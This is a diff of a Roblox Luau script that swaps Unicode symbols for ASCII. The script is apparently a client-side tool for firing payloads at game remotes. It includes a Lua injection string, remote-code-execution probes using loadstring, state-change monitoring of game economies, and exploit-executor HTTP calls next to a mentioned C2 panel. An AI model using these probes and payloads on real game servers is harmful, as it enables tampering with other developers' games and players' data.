         mF(menu, 0, curY-SEP, CTX_W, SEP, GC.DIV, 0.50, 41).Size = UDim2.new(1,0,0,1)
 
@@ -2381,7 +2381,7 @@ local function openCtxMenu(node, canvasPos)
             end)
         end
 
-        -- Text box — sits in the second row of the IB band
+        -- Text box -- sits in the second row of the IB band
         local boxY = curY + 15
         local boxH = IB_H - 17
         local box  = Instance.new("TextBox")
@@ -2414,7 +2414,7 @@ local function openCtxMenu(node, canvasPos)
         curY = curY + IB_H + SEP
     end
 
-    -- ── SECTION: DEFENSE band (control toggle) ────────────────────
+    -- -- SECTION: DEFENSE band (control toggle) --------------------
     mF(menu, 0, curY-SEP, CTX_W, SEP, GC.DIV, 0.45, 41).Size = UDim2.new(1,0,0,1)
 
     local ctrlBand = mF(menu, 0, curY, CTX_W, CTRL_H, GC.CTX_BOT, 0.35, 41)
@@ -2476,7 +2476,7 @@ local function openCtxMenu(node, canvasPos)
 
     curY = curY + CTRL_H + SEP
 
-    -- ── SECTION: Footer (clear wires / delete node) ───────────────
+    -- -- SECTION: Footer (clear wires / delete node) ---------------
     mF(menu, 0, curY-SEP, CTX_W, SEP, GC.DIV, 0.45, 41).Size = UDim2.new(1,0,0,1)
 
     local foot = mF(menu,0,curY,CTX_W,FOOT_H,GC.CTX_TOP,0.45,41)
@@ -2525,7 +2525,7 @@ local function openCtxMenu(node, canvasPos)
     end)
 end
 
--- ── Per-node status badge ───────────────────────────────────────────────────
+-- -- Per-node status badge ---------------------------------------------------
 -- Paints a small status label on a node during/after execution.
 local function setNodeStatus(node, state, text)
     node.runState = state
@@ -2552,7 +2552,7 @@ local function setNodeStatus(node, state, text)
     node.statusLbl.TextColor3 = col
 end
 
--- Verdict panel — shown after a run completes.
+-- Verdict panel -- shown after a run completes.
 local verdictPanel = nil
 local function clearVerdict()
     if verdictPanel then verdictPanel:Destroy() verdictPanel = nil end
@@ -2667,7 +2667,7 @@ local function runChain()
         if node.secured then
             setNodeStatus(node, "severed", "SECURED")
             table.insert(log, { node=node.typeData.id, status="severed",
-                detail="control enforced — chain severed" })
+                detail="control enforced -- chain severed" })
             severedAt = node.typeData.label
             return
         end
@@ -2699,7 +2699,7 @@ local function runChain()
     end)
 end
 
--- ── Node factory ───────────────────────────────────────────────────────────
+-- -- Node factory -----------------------------------------------------------
 local nodeSerial = 0
 local function spawnNode(typeData, cx, cy)
     nodeSerial = nodeSerial + 1
@@ -2709,7 +2709,7 @@ local function spawnNode(typeData, cx, cy)
     cx = math.floor(cx / SNAP) * SNAP
     cy = math.floor(cy / SNAP) * SNAP
 
-    -- ── Glass node body: translucent fill + vertical gradient ──
+    -- -- Glass node body: translucent fill + vertical gradient --
     local nf = mF(graphCanvas, cx, cy, NODE_W, NODE_H,
         GC.NODE_TOP, 0.42, 10)   -- high transparency = game shows through
     nf.Name = "Node_" .. nodeSerial
@@ -2719,7 +2719,7 @@ local function spawnNode(typeData, cx, cy)
     mS(nf, acc, 0.55, 1)
     local nodeGlow = mGlow(nf, acc, 0.80, 2)
 
-    -- Selection brackets (hidden until selected) — four corner Ls
+    -- Selection brackets (hidden until selected) -- four corner Ls
     local selRing = mF(nf, 0, 0, NODE_W, NODE_H, Color3.new(0,0,0), 1, 14)
     selRing.Size = UDim2.new(1,0,1,0)
     selRing.Name = "SelRing"
@@ -2732,7 +2732,7 @@ local function spawnNode(typeData, cx, cy)
         table.insert(brackets, v)
     end
 
-    -- ── Header: gradient bar with frosted feel ──
+    -- -- Header: gradient bar with frosted feel --
     local hdr = mF(nf, 0, 0, NODE_W, HDR_H, GC.NODE_HDR1, 0.25, 11)
     hdr.Size = UDim2.new(1,0,0,HDR_H)
     mC(hdr,7)
@@ -2771,7 +2771,7 @@ local function spawnNode(typeData, cx, cy)
         Enum.Font.Gotham, 9, GC.DIM, Enum.TextXAlignment.Left, 11)
     actionLbl.TextWrapped = true
 
-    -- ── Input port: glowing ring with hollow centre ──
+    -- -- Input port: glowing ring with hollow centre --
     local inPort = mF(nf, -PORT_R, (NODE_H-PORT_R*2)/2, PORT_R*2, PORT_R*2,
         GC.PORT_IN, 0.20, 13)
     mC(inPort, PORT_R)
@@ -2781,7 +2781,7 @@ local function spawnNode(typeData, cx, cy)
     local inDot = mF(inPort, PORT_R-2, PORT_R-2, 4, 4, GC.CANVAS, 0.30, 14)
     mC(inDot, 2)
 
-    -- ── Output port: solid glowing node ──
+    -- -- Output port: solid glowing node --
     local outPort = mF(nf, NODE_W-PORT_R, (NODE_H-PORT_R*2)/2, PORT_R*2, PORT_R*2,
         GC.PORT_OUT, 0.0, 13)
     mC(outPort, PORT_R)
@@ -2812,7 +2812,7 @@ local function spawnNode(typeData, cx, cy)
     }
     table.insert(graphNodes, node)
 
-    -- ── Drag logic ─────────────────────────────────────────────
+    -- -- Drag logic ---------------------------------------------
     local dragActive = false
     local dragOX, dragOY = 0, 0
     local wasDragged = false
@@ -2854,7 +2854,7 @@ local function spawnNode(typeData, cx, cy)
         refreshWires()
     end)
 
-    -- ── Right-click: open context menu ─────────────────────────
+    -- -- Right-click: open context menu -------------------------
     nf.InputBegan:Connect(function(inp)
         if inp.UserInputType == Enum.UserInputType.MouseButton2 then
             local mx, my = screenToCanvas(inp.Position.X, inp.Position.Y)
@@ -2862,7 +2862,7 @@ local function spawnNode(typeData, cx, cy)
         end
     end)
 
-    -- ── Output port click: start wiring ────────────────────────
+    -- -- Output port click: start wiring ------------------------
     local outBtn = mBtn(outPort, 0, 0, PORT_R*2, PORT_R*2, Color3.new(0,0,0), 1, 14)
     outBtn.MouseButton1Click:Connect(function()
         if wiringFrom and wiringFrom ~= node then
@@ -2895,7 +2895,7 @@ local function spawnNode(typeData, cx, cy)
         end
     end)
 
-    -- ── Input port click: cancel wiring ────────────────────────
+    -- -- Input port click: cancel wiring ------------------------
     local inBtn = mBtn(inPort, 0, 0, PORT_R*2, PORT_R*2, Color3.new(0,0,0), 1, 14)
     inBtn.MouseButton1Click:Connect(function()
         if wiringFrom and wiringFrom ~= node then
@@ -2919,8 +2919,8 @@ local function spawnNode(typeData, cx, cy)
     return node
 end
 
--- ── Page builder ───────────────────────────────────────────────────────────
--- ─── CHAIN EXECUTION ENGINE ─────────────────────────────────────────────────
+-- -- Page builder -----------------------------------------------------------
+-- --- CHAIN EXECUTION ENGINE -------------------------------------------------
 -- executeChain() walks the wire graph in topological order and runs each
 -- node's configured action with real Roblox API calls.
 -- Each node shows a live status label; a verdict panel appears at the end.
@@ -2999,24 +2999,24 @@ end
 
 -- Show the verdict panel at the bottom-right of the canvas.
 
--- ─── SERVER RESPONSE MONITOR ─────────────────────────────────────────────────
+-- --- SERVER RESPONSE MONITOR -------------------------------------------------
 -- Observes client-visible state changes after the chain fires to determine
 -- whether the server accepted, processed, or silently dropped the payload.
 --
 -- Observable signals (all client-accessible without server cooperation):
---   1. RemoteFunction return value        → direct server acknowledgement
---   2. OnClientEvent callbacks            → server fired back to us
---   3. Player attribute changes           → server modified player state
---   4. Leaderstats value changes          → economy / score modified
---   5. Character attribute / health delta → combat or damage processed
---   6. ReplicatedStorage structural change → server added/removed objects
+--   1. RemoteFunction return value        -> direct server acknowledgement
+--   2. OnClientEvent callbacks            -> server fired back to us
+--   3. Player attribute changes           -> server modified player state
+--   4. Leaderstats value changes          -> economy / score modified
+--   5. Character attribute / health delta -> combat or damage processed
+--   6. ReplicatedStorage structural change -> server added/removed objects
 --
 -- Verdict states:
---   ACCEPTED  — observable change detected or RemoteFunction returned data
---   CALLBACK  — server fired OnClientEvent back within the observation window
---   SILENT    — chain ran without error but nothing observable changed
---   REJECTED  — pcall caught a server-side error
---   TIMEOUT   — observation window closed with no signal
+--   ACCEPTED  -- observable change detected or RemoteFunction returned data
+--   CALLBACK  -- server fired OnClientEvent back within the observation window
+--   SILENT    -- chain ran without error but nothing observable changed
+--   REJECTED  -- pcall caught a server-side error
+--   TIMEOUT   -- observation window closed with no signal
 
 local SRM_OBSERVATION_WINDOW = 2.0   -- seconds to watch for server response
 
@@ -3106,7 +3106,7 @@ local function srmDiff(before, after)
         end
     end
 
-    -- Leaderstats (economy/score — highest severity)
+    -- Leaderstats (economy/score -- highest severity)
     for k, bv in pairs(before.leaderstats) do
         chk("LEADERSTAT", k, bv, after.leaderstats[k], "CRITICAL")
     end
@@ -3202,24 +3202,24 @@ local function srmObserve(rfReturn, onResult)
     local afterSnap = srmSnapshot()
     local changes   = srmDiff(beforeSnap, afterSnap)
 
-    -- ── Accurate verdict determination ──────────────────────────────────────
+    -- -- Accurate verdict determination --------------------------------------
     --
     -- CRITICAL DISTINCTION (per Luau client-server architecture):
     --
     --   OnClientEvent callbacks and InvokeServer returns are STANDARD NETWORK
-    --   BEHAVIOUR — not evidence of exploit. InvokeServer() ALWAYS gets a
+    --   BEHAVIOUR -- not evidence of exploit. InvokeServer() ALWAYS gets a
     --   return by design (the server ran its own hardcoded script and replied).
     --   A callback on OnClientEvent proves the endpoint is live, nothing more.
     --
     --   TRUE RCE requires an execution sink AND observable proof that the SERVER
-    --   executed YOUR arbitrary logic — not its own pre-written code.
+    --   executed YOUR arbitrary logic -- not its own pre-written code.
     --
     -- Verdict tiers (ascending severity):
-    --   SILENT        — no signal at all
-    --   ENDPOINT LIVE — standard network acknowledgment (not an exploit)
-    --   STATE MODIFIED — observable state change (investigate which handler caused it)
-    --   EXECUTION SINK — server returned proof of dynamic evaluation
-    --   RCE CONFIRMED  — deterministic reflection test passed (server ran our math)
+    --   SILENT        -- no signal at all
+    --   ENDPOINT LIVE -- standard network acknowledgment (not an exploit)
+    --   STATE MODIFIED -- observable state change (investigate which handler caused it)
+    --   EXECUTION SINK -- server returned proof of dynamic evaluation
+    --   RCE CONFIRMED  -- deterministic reflection test passed (server ran our math)
 
     -- Check for RCE confirmation via Deterministic Reflection:
     -- If we sent 59483 + 20394 and server returned 79877, only an execution
@@ -3266,7 +3266,7 @@ local function srmObserve(rfReturn, onResult)
         verdict       = "RCE CONFIRMED"
         verdictDetail = "Deterministic reflection test PASSED. Server returned "
                      .. tostring(SRM_EXPECTED)
-                     .. " — this value can only result from dynamic evaluation of "
+                     .. " -- this value can only result from dynamic evaluation of "
                      .. "your arithmetic payload. An execution sink (loadstring or "
                      .. "custom interpreter) executed your code."
     elseif hasEconomyChange then
@@ -3276,12 +3276,12 @@ local function srmObserve(rfReturn, onResult)
                      .. "handler that modified game state. Investigate WHICH handler "
                      .. "triggered this and whether it validates input."
     elseif rfReturn ~= nil or #callbacks > 0 then
-        -- Standard network acknowledgment — NOT evidence of exploit
+        -- Standard network acknowledgment -- NOT evidence of exploit
         verdict       = "ENDPOINT LIVE"
         verdictDetail = "The endpoint responded via standard network protocol. "
                      .. "This is NOT evidence of RCE. InvokeServer() always returns "
                      .. "(the server ran its own hardcoded script). OnClientEvent "
-                     .. "callbacks confirm the gate is open — not that you passed it. "
+                     .. "callbacks confirm the gate is open -- not that you passed it. "
                      .. "Run the RCE VERIFY payload to test for execution sinks."
     elseif #changes > 0 then
         verdict       = "STATE MODIFIED"
@@ -3314,14 +3314,14 @@ end
 local function showSrmPanel(srmResult)
     closeSrmPanel()
 
-    -- ── Accurate verdict colour/background/label system ─────────────────
+    -- -- Accurate verdict colour/background/label system -----------------
     -- Tiers reflect actual architectural significance, not just "got a response."
     local VERDICT_COL = {
-        ["RCE CONFIRMED"]  = Color3.fromRGB(255,  60,  80),  -- red — critical
-        ["STATE MODIFIED"] = Color3.fromRGB(218, 155,  40),  -- amber — investigate
-        ["ENDPOINT LIVE"]  = Color3.fromRGB( 80, 140, 220),  -- blue — informational
-        ["SILENT"]         = Color3.fromRGB( 80,  85, 100),  -- grey — no signal
-        ["REJECTED"]       = Color3.fromRGB(218,  60,  68),  -- red — error
+        ["RCE CONFIRMED"]  = Color3.fromRGB(255,  60,  80),  -- red -- critical
+        ["STATE MODIFIED"] = Color3.fromRGB(218, 155,  40),  -- amber -- investigate
+        ["ENDPOINT LIVE"]  = Color3.fromRGB( 80, 140, 220),  -- blue -- informational
+        ["SILENT"]         = Color3.fromRGB( 80,  85, 100),  -- grey -- no signal
+        ["REJECTED"]       = Color3.fromRGB(218,  60,  68),  -- red -- error
     }
     local VERDICT_BG = {
         ["RCE CONFIRMED"]  = Color3.fromRGB( 48,   6,  12),
@@ -3332,10 +3332,10 @@ local function showSrmPanel(srmResult)
     }
     local VERDICT_LABEL = {
         ["RCE CONFIRMED"]  = "RCE CONFIRMED",
-        ["STATE MODIFIED"] = "STATE MODIFIED — INVESTIGATE",
+        ["STATE MODIFIED"] = "STATE MODIFIED -- INVESTIGATE",
         ["ENDPOINT LIVE"]  = "ENDPOINT LIVE  (not an exploit)",
-        ["SILENT"]         = "SILENT — NO SIGNAL",
-        ["REJECTED"]       = "REJECTED — SERVER ERROR",
+        ["SILENT"]         = "SILENT -- NO SIGNAL",
+        ["REJECTED"]       = "REJECTED -- SERVER ERROR",
     }
 
     local vc  = VERDICT_COL[srmResult.verdict] or GC.DIM
@@ -3368,7 +3368,7 @@ local function showSrmPanel(srmResult)
     mGlow(pf, vc, 0.55, 3)
     srmFrame = pf
 
-    -- ── Header ──────────────────────────────────────────────────
+    -- -- Header --------------------------------------------------
     local hdr = mF(pf, 0, 0, PW, HDR_H, Color3.fromRGB(8,9,16), 0.25, 89)
     hdr.Size = UDim2.new(1,0,0,HDR_H)
     mC(hdr, 7)
@@ -3428,7 +3428,7 @@ local function showSrmPanel(srmResult)
     local curY = HDR_H + SEP
     mF(pf,0,HDR_H,PW,SEP,vc,0.60,89).Size=UDim2.new(1,0,0,1)
 
-    -- ── RemoteFunction return value ──────────────────────────────
+    -- -- RemoteFunction return value ------------------------------
     if srmResult.rfReturn ~= nil then
         local rfStr = type(srmResult.rfReturn) == "table"
             and "table {" .. tostring(#srmResult.rfReturn) .. " keys}"
@@ -3441,11 +3441,11 @@ local function showSrmPanel(srmResult)
         mF(pf,0,curY-SEP,PW,SEP,GC.DIV,0.65,89).Size=UDim2.new(1,0,0,1)
     end
 
-    -- ── Callbacks received ───────────────────────────────────────
+    -- -- Callbacks received ---------------------------------------
     if #srmResult.callbacks > 0 then
         for i, cbk in ipairs(srmResult.callbacks) do
             local ry = curY + (i-1)*18
-            mL(pf, 10, ry+2, 14, 14, "←",
+            mL(pf, 10, ry+2, 14, 14, "<-",
                 Enum.Font.GothamBold, 9,
                 Color3.fromRGB(100,170,255),
                 Enum.TextXAlignment.Center, 90)
@@ -3463,7 +3463,7 @@ local function showSrmPanel(srmResult)
         mF(pf,0,curY-SEP,PW,SEP,GC.DIV,0.65,89).Size=UDim2.new(1,0,0,1)
     end
 
-    -- ── State changes ────────────────────────────────────────────
+    -- -- State changes --------------------------------------------
     if #srmResult.changes > 0 then
         local SEV_COL = {
             CRITICAL = GC.ERR, HIGH = Color3.fromRGB(230,110,70),
@@ -3482,9 +3482,9 @@ local function showSrmPanel(srmResult)
             mL(pf, bw+14, ry+3, PW-bw-20, 12, chg.key,
                 Enum.Font.GothamBold, 8, col,
                 Enum.TextXAlignment.Left, 90)
-            -- Before → After
+            -- Before -> After
             local delta = tostring(chg.before):sub(1,18)
-                       .. " → " .. tostring(chg.after):sub(1,18)
+                       .. " -> " .. tostring(chg.after):sub(1,18)
             mL(pf, 10, ry+14, PW-16, 10, delta,
                 Enum.Font.Gotham, 7, GC.MID,
                 Enum.TextXAlignment.Left, 90)
@@ -3493,7 +3493,7 @@ local function showSrmPanel(srmResult)
         mF(pf,0,curY-SEP,PW,SEP,GC.DIV,0.65,89).Size=UDim2.new(1,0,0,1)
     end
 
-    -- ── Footer: observation window info ─────────────────────────
+    -- -- Footer: observation window info -------------------------
     mL(pf, 10, curY+3, PW-16, 14,
         string.format("Observed %.1fs  |  %d callback%s  |  %d change%s",
             SRM_OBSERVATION_WINDOW,
@@ -3524,7 +3524,7 @@ local function showVerdict(results, totalTime, severedAt)
     -- Header
     local hdrTxt = chainBroke
         and "CHAIN SEVERED"
-        or  "CHAIN COMPLETE — NO CONTROLS ENFORCED"
+        or  "CHAIN COMPLETE -- NO CONTROLS ENFORCED"
     mL(vf, 10, 4, VW-16, 14, hdrTxt,
         Enum.Font.GothamBold, 9, borderCol,
         Enum.TextXAlignment.Left, 51)
@@ -3598,7 +3598,7 @@ local function executeChain()
             table.insert(results, {
                 label  = node.typeData.label,
                 state  = "severed",
-                detail = "Control enforced — chain severed here.",
+                detail = "Control enforced -- chain severed here.",
             })
             if severedAt == nil then severedAt = node.typeData.label end
             -- Everything past this in topological order is also unreached
@@ -3632,7 +3632,7 @@ local function executeChain()
             break
         end
 
-        -- ── Execute by node type ──────────────────────────────────
+        -- -- Execute by node type ----------------------------------
         if id == "INPUT" then
             -- User input: seed the payload from the input box
             payload = node.inputValue or ""
@@ -3652,14 +3652,14 @@ local function executeChain()
                         inst:FireServer(payload)
                         return "Fired"
                     end)
-                    detail = ok and ("FireServer() → " .. tostring(result))
+                    detail = ok and ("FireServer() -> " .. tostring(result))
                               or   ("Error: " .. tostring(result))
                     if ok then result = payload end  -- carry payload forward
                 elseif inst.ClassName == "RemoteFunction" then
                     ok, result = pcall(function()
                         return inst:InvokeServer(payload)
                     end)
-                    detail = ok and ("InvokeServer() → " .. tostring(result):sub(1,30))
+                    detail = ok and ("InvokeServer() -> " .. tostring(result):sub(1,30))
                               or   ("Error: " .. tostring(result))
                     if ok then payload = result end  -- update payload with return
                 else
@@ -3682,21 +3682,21 @@ local function executeChain()
                         inst:Fire(payload)
                         return "Fired"
                     end)
-                    detail = ok and ("Fire() → OK")
+                    detail = ok and ("Fire() -> OK")
                               or   ("Error: " .. tostring(result))
                     if ok then result = payload end
                 elseif inst.ClassName == "BindableFunction" then
                     ok, result = pcall(function()
                         return inst:Invoke(payload)
                     end)
-                    detail = ok and ("Invoke() → " .. tostring(result):sub(1,30))
+                    detail = ok and ("Invoke() -> " .. tostring(result):sub(1,30))
                               or   ("Error: " .. tostring(result))
                     if ok then payload = result end
                 else
                     ok, detail = false, "Unknown bindable class: " .. inst.ClassName
                 end
             end
-            -- Record custody: BINDABLE handoff — identity must be manually present
+            -- Record custody: BINDABLE handoff -- identity must be manually present
             -- This is where custody breaks if the developer dropped the Player object
             clStep = clStep + 1
             CL:recordStep(clStep, "BINDABLE",
@@ -3733,7 +3733,7 @@ local function executeChain()
                     ok, result = pcall(function()
                         return require(numId)
                     end)
-                    detail = ok and ("require(" .. assetId .. ") → " .. type(result))
+                    detail = ok and ("require(" .. assetId .. ") -> " .. type(result))
                               or   ("Error: " .. tostring(result):sub(1,50))
                     if ok then payload = result end
                 end
@@ -3745,9 +3745,9 @@ local function executeChain()
                 ok, detail = false, "No URL entered."
             else
                 local method = node.httpMethod or "POST"
-                -- Use HTTP:post() / HTTP:get() — the same path as the HTTP tab
+                -- Use HTTP:post() / HTTP:get() -- the same path as the HTTP tab
                 -- and C2 panel. These carry the full executor fallback chain
-                -- (request → syn.request → http_request) instead of calling
+                -- (request -> syn.request -> http_request) instead of calling
                 -- HttpService:PostAsync/GetAsync directly, which is blocked
                 -- from a LocalScript and produces int568 Blocked function.
                 local reqOk, status, body, ms
@@ -3759,7 +3759,7 @@ local function executeChain()
                 ok     = reqOk
                 result = body
                 detail = ok
-                    and (method .. " " .. tostring(status) .. " (" .. tostring(ms) .. "ms) → " .. tostring(body):sub(1,40))
+                    and (method .. " " .. tostring(status) .. " (" .. tostring(ms) .. "ms) -> " .. tostring(body):sub(1,40))
                     or  ("Error: " .. tostring(body):sub(1,50))
                 if ok then payload = result end
             end
@@ -3771,7 +3771,7 @@ local function executeChain()
             detail = "Pass-through."
         end
 
-        -- ── Record result ─────────────────────────────────────────
+        -- -- Record result -----------------------------------------
         local state = ok and "success" or "error"
         local shortDetail = detail:sub(1, 48)
         setNodeRunState(node, state, ok and "OK" or "ERR")
@@ -3803,10 +3803,10 @@ local function executeChain()
     if clSession and clSession.verdict ~= "INTACT" then
         -- Append custody finding to results so it appears in the verdict panel
         local custodyMsg = ({
-            BROKEN      = "⚠  CUSTODY BREAK at step "..tostring(clSession.breakStep or "?")
-                          .." — Player object dropped at handoff.",
-            SUBSTITUTED = "✗  CUSTODY CRITICAL at step "..tostring(clSession.subStep or "?")
-                          .." — UserId from payload used as identity.",
+            BROKEN      = "[!]  CUSTODY BREAK at step "..tostring(clSession.breakStep or "?")
+                          .." -- Player object dropped at handoff.",
+            SUBSTITUTED = "[X]  CUSTODY CRITICAL at step "..tostring(clSession.subStep or "?")
+                          .." -- UserId from payload used as identity.",
         })[clSession.verdict]
         if custodyMsg then
             table.insert(results, {
@@ -3819,7 +3819,7 @@ local function executeChain()
 
     showVerdict(results, elapsed, severedAt)
 
-    -- ── Server response observation ───────────────────────────────────────
+    -- -- Server response observation ---------------------------------------
     -- Extract the RemoteFunction return value if the first REMOTE/INGRESS
     -- node used InvokeServer (its result is in the chain payload).
     local rfReturn = nil
@@ -3867,7 +3867,7 @@ local function buildTraceGraph(result)
 
     -- Place nodes left to right
     local SX, SY, GAP = 30, 90, NODE_W + 55
-    local placed = {}   -- id → node
+    local placed = {}   -- id -> node
 
     for i, id in ipairs(toPlace) do
         local td = nodeTypeMap[id]
@@ -3943,7 +3943,7 @@ local function buildTraceGraph(result)
     return placed
 end
 
--- ── Trace report panel ────────────────────────────────────────────────────────
+-- -- Trace report panel --------------------------------------------------------
 local traceReportFrame = nil
 
 local function showTraceReport(result, placed)
@@ -3973,7 +3973,7 @@ local function showTraceReport(result, placed)
     mGlow(rf, headerCol, 0.58, 3)
     traceReportFrame = rf
 
-    -- ── Header (also serves as drag handle) ──────────────────────
+    -- -- Header (also serves as drag handle) ----------------------
     local hdr = mF(rf, 0, 0, RW, HDR_H, GC.CTX_BOT, 0.22, 81)
     hdr.Size = UDim2.new(1,0,0,HDR_H)
     mC(hdr, 7)
@@ -4008,7 +4008,7 @@ local function showTraceReport(result, placed)
         if traceReportFrame then traceReportFrame:Destroy() traceReportFrame=nil end
     end)
 
-    -- ── Drag logic on the header ──────────────────────────────────
+    -- -- Drag logic on the header ----------------------------------
     local dragActive = false
     local dragSX, dragSY, dragFX, dragFY = 0,0,0,0
     hdr.InputBegan:Connect(function(inp)
@@ -4037,10 +4037,10 @@ local function showTraceReport(result, placed)
         if not rf.Parent then moveConn:Disconnect() end
     end)
 
-    -- ── Separator ────────────────────────────────────────────────
+    -- -- Separator ------------------------------------------------
     mF(rf, 0, HDR_H, RW, 1, headerCol, 0.60, 81).Size = UDim2.new(1,0,0,1)
 
-    -- ── Connection rows (clickable) ───────────────────────────────
+    -- -- Connection rows (clickable) -------------------------------
     -- Clicking a row scrolls the canvas to that node and selects it.
     local function scrollToNode(node)
         if not node or not graphCanvas then return end
@@ -4136,7 +4136,7 @@ local function showTraceReport(result, placed)
         end
     end
 
-    -- ── Footer ───────────────────────────────────────────────────
+    -- -- Footer ---------------------------------------------------
     local footY = HDR_H + 1 + math.max(#topConns,1) * ROW_H
     mF(rf, 0, footY, RW, 1, headerCol, 0.65, 81).Size = UDim2.new(1,0,0,1)
 
@@ -4145,7 +4145,7 @@ local function showTraceReport(result, placed)
         table.insert(stageList, id)
     end
     local sumTxt = #stageList > 0
-        and ("Evidenced: " .. table.concat(stageList, " → "))
+        and ("Evidenced: " .. table.concat(stageList, " -> "))
         or  "No stage evidence found."
     mL(rf, 8, footY+2, RW-16, FOOT_H-2, sumTxt,
         Enum.Font.Gotham, 8, GC.DIM, Enum.TextXAlignment.Left, 82)
@@ -4178,7 +4178,7 @@ end
 
 
 
--- ─── RISK DETAIL PANEL ────────────────────────────────────────────────────────
+-- --- RISK DETAIL PANEL --------------------------------------------------------
 -- Floats above the canvas (parented to ScreenGui).
 -- Opens when the user clicks the risk badge in the toolbar.
 -- Closes when the close button is pressed or when the badge is clicked again.
@@ -4222,7 +4222,7 @@ local function showRiskDetail()
     mGlow(df, r.tierCol, 0.55, 3)
     riskDetailFrm = df
 
-    -- ── Header ─────────────────────────────────────────────────────
+    -- -- Header -----------------------------------------------------
     local hdr = mF(df, 0, 0, DW, HDR_H, Color3.fromRGB(8,9,16), 0.25, 86)
     hdr.Size = UDim2.new(1,0,0,HDR_H)
     mC(hdr, 7)
@@ -4248,7 +4248,7 @@ local function showRiskDetail()
         Enum.Font.GothamBold, 9, r.tierCol,
         Enum.TextXAlignment.Left, 87)
     mL(hdr, CIRC+18, 22, DW-CIRC-48, 14,
-        r.tier .. " RISK  —  " .. r.score .. " / 100",
+        r.tier .. " RISK  --  " .. r.score .. " / 100",
         Enum.Font.GothamBold, 10, r.tierCol,
         Enum.TextXAlignment.Left, 87)
 
@@ -4280,10 +4280,10 @@ local function showRiskDetail()
         if not df.Parent then mc:Disconnect() end
     end)
 
-    -- ── Separator ─────────────────────────────────────────────────
+    -- -- Separator -------------------------------------------------
     mF(df, 0, HDR_H, DW, SEP, r.tierCol, 0.60, 86).Size = UDim2.new(1,0,0,1)
 
-    -- ── Reason rows ───────────────────────────────────────────────
+    -- -- Reason rows -----------------------------------------------
     local SEV_COL = {
         CRITICAL = GC.ERR,
         HIGH     = Color3.fromRGB(230, 110, 70),
@@ -4344,7 +4344,7 @@ local function showRiskDetail()
         end
     end
 
-    -- ── Footer: summary recommendation ────────────────────────────
+    -- -- Footer: summary recommendation ----------------------------
     local footY = HDR_H + SEP + #showReasons * ROW_H + SEP
     mF(df, 0, footY-1, DW, 1, r.tierCol, 0.65, 86).Size=UDim2.new(1,0,0,1)
     local rec = r.tier == "HIGH"
@@ -4367,7 +4367,7 @@ local function showRiskDetail()
     recLbl.Parent              = df
 end
 
--- ─── PAYLOAD CONSOLE ──────────────────────────────────────────────────────────
+-- --- PAYLOAD CONSOLE ----------------------------------------------------------
 -- Interactive testing workbench. Lets developers draft or generate edge-case
 -- payloads and fire them through the configured chain, observing real server
 -- responses in a live output log.
@@ -4384,7 +4384,7 @@ local consolePayloadTxt = ""  -- human-readable representation of current payloa
 local consoleBusy     = false -- prevents overlapping fire calls
 local MAX_LOG_LINES   = 60
 
--- ── Payload generator catalogue ───────────────────────────────────────────────
+-- -- Payload generator catalogue -----------------------------------------------
 -- Each entry: { label (button text), desc (tooltip line), fn (returns value) }
 local GENERATORS = {
     { label="nil",     desc="Null / nil value",
@@ -4397,7 +4397,7 @@ local GENERATORS = {
       fn=function() return true end },
     { label="0",       desc="Zero (integer)",
       fn=function() return 0 end },
-    { label="∞",       desc="math.huge — float overflow / division by zero",
+    { label="inf",       desc="math.huge -- float overflow / division by zero",
       fn=function() return math.huge end },
     { label="2^53",    desc="Maximum safe integer (IEEE 754 precision limit)",
       fn=function() return 2^53 end },
@@ -4415,7 +4415,7 @@ local GENERATORS = {
       fn=function() return {a={b={c={d={e=1}}}}} end },
     { label="mixed",   desc="Mixed-type array {1, 'x', true, nil}",
       fn=function() return {1, "x", true} end },
-    { label="×100",    desc="Table with 100 sequential integer keys",
+    { label="x100",    desc="Table with 100 sequential integer keys",
       fn=function()
           local t = {}
           for i = 1, 100 do t[i] = i end
@@ -4428,8 +4428,8 @@ local GENERATORS = {
     { label="Lua",     desc="Lua injection attempt: '; require(0)--",
       fn=function() return "'; require(0)--" end },
 
-    -- ── RCE VERIFICATION payloads ──────────────────────────────────────────
-    -- These do not inject exploits — they PROVE whether an execution sink exists.
+    -- -- RCE VERIFICATION payloads ------------------------------------------
+    -- These do not inject exploits -- they PROVE whether an execution sink exists.
 
     { label="RCE VERIFY", desc="Deterministic reflection test: send 59483+20394, "
                              .. "check if server returns 79877. Only an execution "
@@ -4443,7 +4443,7 @@ local GENERATORS = {
 
     { label="LOADSTRING", desc="Probe for loadstring() availability. Sends a string "
                              .. "that evaluates to a known value if the server passes "
-                             .. "it to loadstring(). Safe — no side effects if the "
+                             .. "it to loadstring(). Safe -- no side effects if the "
                              .. "endpoint does not have an execution sink.",
       fn=function()
           -- If the server does: local f=loadstring(payload); return f()
@@ -4460,7 +4460,7 @@ local GENERATORS = {
       end },
 }
 
--- ── Helpers ───────────────────────────────────────────────────────────────────
+-- -- Helpers -------------------------------------------------------------------
 local function consoleTimestamp()
     return os.date("%H:%M:%S")
 end
@@ -4477,7 +4477,7 @@ local function valueRepr(v)
     end
     if t == "string" then
         if #v > 40 then
-            return '"' .. v:sub(1,37):gsub("\0","\\0") .. '…" (' .. #v .. ' chars)'
+            return '"' .. v:sub(1,37):gsub("\0","\\0") .. '..." (' .. #v .. ' chars)'
         end
         return '"' .. v:gsub("\0","\\0") .. '"'
     end
@@ -4555,7 +4555,7 @@ end
 -- Fire the current payload through the resolved target
 local function firePayload(iterations, payloadTxtBox, targetLbl)
     if consoleBusy then
-        appendLog("[!] Already firing — wait for current run to finish.", GC.WARN)
+        appendLog("[!] Already firing -- wait for current run to finish.", GC.WARN)
         return
     end
     consoleBusy = true
@@ -4588,13 +4588,13 @@ local function firePayload(iterations, payloadTxtBox, targetLbl)
         end
     end
 
-    appendLog(string.format("[%s] ─── Fire ×%d  →  %s  payload: %s",
+    appendLog(string.format("[%s] --- Fire x%d  ->  %s  payload: %s",
         consoleTimestamp(), iterations, inst.Name, valueRepr(payload)), GC.DIM)
 
     task.spawn(function()
         for i = 1, iterations do
             local ts = consoleTimestamp()
-            appendLog(string.format("[%s] → [%d/%d]  %s",
+            appendLog(string.format("[%s] -> [%d/%d]  %s",
                 ts, i, iterations, valueRepr(payload)), GC.PRI)
 
             local ok, result = pcall(function()
@@ -4610,23 +4610,23 @@ local function firePayload(iterations, payloadTxtBox, targetLbl)
 
             if ok then
                 local res = valueRepr(result)
-                appendLog(string.format("[%s] ←  %s", ts, res), GC.CHK)
+                appendLog(string.format("[%s] <-  %s", ts, res), GC.CHK)
             else
-                appendLog(string.format("[%s] ✗  %s", ts,
